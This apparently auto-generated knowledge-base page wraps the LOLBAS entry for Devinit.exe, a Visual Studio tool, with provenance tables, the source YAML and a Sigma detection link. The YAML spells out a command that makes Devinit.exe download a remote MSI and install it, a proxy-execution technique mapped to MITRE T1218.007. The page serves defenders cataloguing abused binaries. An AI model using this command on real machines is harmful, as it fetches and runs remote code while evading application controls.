---
parsed_by: focuslocust
source: lolbas
type: generated
---
# Devinit.exe

[Home](../../../README.md)

## Provenance

| Field | Value |
| --- | --- |
| Source | `lolbas` |
| Type | `tool` |
| Record ID | `devinit.exe` |
| Source file | `/home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Devinit.yml` |
| Parsed by | `focuslocust` |
| Relationship mode | `explicit / conservative inferred / manual` |

## Generated Concept Page

- [Devinit.exe](../../tools/windows/devinit.exe.md)

## Extracted Fields

| Field | Value |
| --- | --- |
| id | devinit.exe |
| name | Devinit.exe |
| type | tool |
| source | lolbas |
| url | https://twitter.com/mrd0x/status/1460815932402679809 |

## Preserved Source Material

```yaml
Acknowledgement:
- Handle: '@mrd0x'
  Person: mr.d0x
Author: mr.d0x
Commands:
- Category: Execute
  Command: devinit.exe run -t msi-install -i {REMOTEURL:.msi}
  Description: Downloads an MSI file to C:\Windows\Installer and then installs it.
  MitreID: T1218.007
  OperatingSystem: Windows 10, Windows 11
  Privileges: User
  Tags:
  - Execute: MSI
  - Execute: Remote
  Usecase: Executes code from a (remote) MSI file.
Created: 2022-01-20
Description: Visual Studio 2019 tool
Detection:
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
Full_Path:
- Path: C:\Program Files\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe
- Path: C:\Program Files (x86)\Microsoft Visual Studio\<version>\Community\Common7\Tools\devinit\devinit.exe
Name: Devinit.exe
Resources:
- Link: https://twitter.com/mrd0x/status/1460815932402679809
_source_path: /home/adams/scorchederf/focuslocust/.cache/lolbas/yml/OtherMSBinaries/Devinit.yml
```

## Detection / Analysis Notes

```text
Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
```

```text
- Sigma: https://github.com/SigmaHQ/sigma/blob/b02e3b698afbaae143ac4fb36236eb0b41122ed7/rules/windows/process_creation/proc_creation_win_devinit_lolbin_usage.yml
```
